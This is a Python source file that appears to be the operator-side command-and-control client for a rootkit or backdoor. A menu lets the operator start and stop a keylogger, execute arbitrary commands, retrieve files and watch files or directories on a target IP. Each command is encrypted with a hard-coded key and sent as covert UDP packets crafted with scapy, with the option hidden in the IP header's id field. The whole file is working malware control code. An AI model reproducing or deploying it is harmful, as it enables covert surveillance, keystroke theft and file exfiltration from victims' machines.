import warnings

warnings.filterwarnings(action="ignore")
from encryption import encryption
from scapy.all import *
from scapy.layers.inet import IP, UDP
import logging

key = b'eoxuXDM-FYNQ_o0PxQaxCcXW-u6h26ytH4vx2zYCiM0='
code = "secret"
SIZE = 1024
port = 10001


def main():
    logging.basicConfig(level=logging.INFO)
    try:
        ip = input("Enter backdoor IP: ")
        # ip = "192.168.1.26"
        controller = c2(ip)
        while True:
            opt = menu()
            if menu_parse(opt, controller) == 1:
                break
    except KeyboardInterrupt:
        pass


def menu():
    print("1. start key log\n2. stop key log\n3. execute command\n4. retrieve file\n5. start watching file\n6. "
          "stop watching file\n7. start watching directory\n8. stop watching directory\n9. exit")
    option = input()
    return option


def menu_parse(option, controller):
    match option:
        case "1":
            controller.opt_keylog(0)
            return 0
        case "2":
            controller.opt_keylog(1)
            return 0
        case "3":
            controller.opt_execute(input("Enter Command to Execute: "))
            return 0
        case "4":
            controller.opt_file_get(input("Enter location of file to get: "))
            return 0
        case "5":
            controller.opt_file_watch(0, input("Enter location of file to watch: "))
            return 0
        case "6":
            controller.opt_file_watch(1, input("Enter location of file to stop watching: "))
            return 0
        case "7":
            controller.opt_directory(0, input("Enter location of directory to watch: "))
            return 0
        case "8":
            controller.opt_directory(1, input("Enter location of directory to stop watch: "))
            return 0
        case "9":
            controller.disconnect()
            return 1
        case _:
            os.system("clear")
            logging.info("Select a valid option")
            return 0


class c2:
    def __init__(self, ip):
        self.kit_ip = ip
        self.encrypter = encryption(key)

    def opt_keylog(self, opt):
        match opt:
            case 0:
                logging.info("Start keylogger")
                self.command_sender(1, "blankdata")
            case 1:
                logging.info("Stop keylogger")
                self.command_sender(2, "blankdata")
            case _:
                logging.debug("Error")

    def opt_execute(self, opt):
        logging.info("Executing command:" + opt)
        self.command_sender(3, opt)

    def opt_file_get(self, opt):
        logging.info("Getting file:" + opt)
        self.command_sender(4, opt)

    def opt_file_watch(self, opt, file):
        match opt:
            case 0:
                self.command_sender(5, file)
                logging.info("Start watching file:" + file)
            case 1:
                self.command_sender(6, file)
                logging.info("Stop watching file:" + file)
            case _:
                print("Error")

    def opt_directory(self, opt, directory):
        match opt:
            case 0:
                self.command_sender(7, directory)
                logging.info("Start watching directory:" + directory)
            case 1:
                self.command_sender(8, directory)
                logging.info("Stop watching directory:" + directory)
            case _:
                logging.debug("Error")

    def disconnect(self):
        print("disconnect from rootkit")

    # WILL BE DOING AS SINGLE PORT, OPTION IN ID, INSTRUCTIONS IN DATA
    # Example stopping keylog: port 52 (arbitrary right now), ID=XXX2 (last digit as 2),
    def command_sender(self, opt, data):
        rand_id = int(str(random.randrange(100, 999)) + str(opt))

        s_port = random.randrange(35000, 62000)
        encrypted_data = self.encrypter.encrypt(code + ":" + data)
        dgram = IP(dst=self.kit_ip, id=rand_id) / UDP(sport=s_port, dport=port,
                                                      len=int(len(encrypted_data))) / encrypted_data
        send(dgram, verbose=0)


if __name__ == '__main__':
    main()
